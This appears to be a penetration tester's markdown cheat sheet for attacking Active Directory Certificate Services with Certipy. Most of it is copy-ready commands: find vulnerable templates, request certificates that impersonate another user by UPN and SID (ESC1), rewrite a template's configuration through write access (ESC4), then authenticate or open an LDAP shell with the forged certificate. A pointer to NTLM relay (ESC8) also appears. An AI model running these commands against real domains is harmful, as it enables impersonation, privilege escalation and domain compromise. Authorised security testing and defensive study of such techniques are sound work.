# AD CS: template checks

Note CA name/FQDN, template, publication, enrollment/edit rights, SID.

```bash
certipy find -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> -vulnerable -stdout
```

## ESC1
Needs enrollee-supplied SAN, an authentication EKU, enrollment rights, publication by the CA, no manager approval / authorized-signature requirement.

```bash
certipy req -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> \
  -target <CA-FQDN> -ca <CA-NAME> -template <TEMPLATE> \
  -upn <TARGET-USER>@<DOMAIN.TLD> -sid <TARGET-SID>
certipy auth -pfx <FILE>.pfx -dc-ip <DC-IP> -no-hash -no-save
```
- Check the issued cert's identity + SID, then the auth result.
- Patched DCs enforce strong certificate mapping: UPN-only recipes from older labs fail → keep `-sid`.
- Schannel has its own mapping / trust prerequisites.

## ESC4 (write access to the template)
Save the original first (Certipy 5 flags; older guides use `-save-old`):
```bash
certipy template -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> \
  -template <TEMPLATE> -save-configuration template-before.json
certipy template -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> \
  -template <TEMPLATE> -write-default-configuration <YOUR-SID> \
  -save-configuration template-prechange.json
```
Then do ESC1, and restore:
```bash
certipy template -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> \
  -template <TEMPLATE> -write-configuration template-before.json
```
- Use your own SID in `-write-default-configuration`, not a broad default principal.
- Re-enumerate afterwards; don't overwrite concurrent edits.

## ESC8
Live relay to the enrollment endpoint → [ntlm-relay](ntlm-relay.md#ad-cs-relay-esc8). A captured NetNTLM file is not enough.

## PKINIT and Schannel failures
`KDC_ERR_PADATA_TYPE_NOSUPP` → DC PKINIT support / certificate config. Schannel / LDAP instead:
```bash
certipy auth -pfx <FILE>.pfx -dc-ip <DC-IP> -ldap-shell
```
- The LDAP shell has the mapped principal's rights, not domain admin by default: check identity (`whoami`) and `help` first.
- Deleting a PFX does not revoke a certificate.
